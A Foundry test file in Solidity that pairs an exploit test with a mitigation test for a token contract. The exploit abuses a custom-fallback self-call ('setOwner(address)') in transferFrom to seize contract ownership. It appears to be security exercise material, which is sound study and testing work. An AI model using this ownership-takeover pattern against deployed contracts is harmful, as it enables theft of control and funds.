// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/A15/CustomFallbackToken.sol";
import "../src/A15/CustomFallbackTokenFixed.sol";

contract CustomFallbackTest is Test {
    CustomFallbackToken internal vulnerableToken;
    CustomFallbackTokenFixed internal fixedToken;

    address internal deployer = makeAddr("deployer");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(deployer);
        vulnerableToken = new CustomFallbackToken();
        vulnerableToken.mint(attacker, 100 ether);
    }

    // --- VULNERABILITY TEST ---

    function test_Exploit_BypassAuthAndBecomeOwner() public {
        // Arrange: Confirm the initial owner and attacker's status.
        assertEq(vulnerableToken.owner(), deployer);
        assertNotEq(vulnerableToken.owner(), attacker);

        // Attacker crafts the malicious parameters for the self-call.
        address from = attacker;
        address to = address(vulnerableToken); // Target the contract itself
        uint256 amount = 1; // A nominal amount is enough
        string memory customFallback = "setOwner(address)"; // The target function
        bytes memory data = abi.encode(attacker); // The argument: attacker's address

        // Act: Attacker triggers the vulnerable function.
        vm.prank(attacker);
        vulnerableToken.transferFrom(from, to, amount, data, customFallback);

        // Assert: The owner of the contract is now the attacker.
        assertEq(
            vulnerableToken.owner(),
            attacker,
            "Attacker should be the new owner"
        );
    }

    // --- MITIGATION TEST ---

    function test_Mitigation_CannotBypassAuth() public {
        // Arrange: Deploy the fixed contract.
        vm.prank(deployer);
        fixedToken = new CustomFallbackTokenFixed();
        fixedToken.mint(attacker, 100 ether);

        // The attack vector `transferFrom` is removed. We test the core auth fix.
        // An attacker tries to call a function that attempts an internal,
        // privileged call on their behalf.

        // Act & Assert: The call should fail because internal calls are no longer trusted.
        vm.prank(attacker);
        vm.expectRevert("Not authorized");
        fixedToken.tryToCallSetOwnerInternally(attacker);

        // Final check: Owner remains unchanged.
        assertEq(fixedToken.owner(), deployer);
    }
}
